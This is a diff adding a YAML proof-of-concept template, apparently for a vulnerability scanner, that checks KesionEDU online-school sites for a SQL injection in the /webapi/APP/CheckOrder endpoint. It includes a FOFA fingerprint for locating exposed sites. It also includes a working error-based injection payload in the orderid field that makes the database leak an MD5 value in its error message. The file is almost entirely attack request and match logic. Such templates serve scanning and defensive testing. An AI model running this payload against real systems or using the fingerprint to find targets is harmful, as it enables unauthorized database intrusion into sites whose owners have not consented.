@@ -1,0 +1,22 @@
+id: poc-yaml-kesion-edu-checkorder-sqli
+info:
+  name: 科汛网校KesionEDU CheckOrder SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 科汛网校KesionEDU
+  fofa: body="/KS_Inc/static/edu"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /webapi/APP/CheckOrder
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: '{"orderid":"1'' AND 7755 IN (SELECT (CHAR(113)+(SELECT (CASE WHEN (7755=7755)
+    THEN CHAR(49) ELSE CHAR(48) END))+sys.fn_varbintohexstr(hashbytes(''MD5'',''{{.t1}}''))))--
+    Ahbw","apptoken":"1","ordertype":"1"}'
+  expression: status_code == 500 && contains(body,"在将 nvarchar 值") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,"0x" + t2)
+transport: http
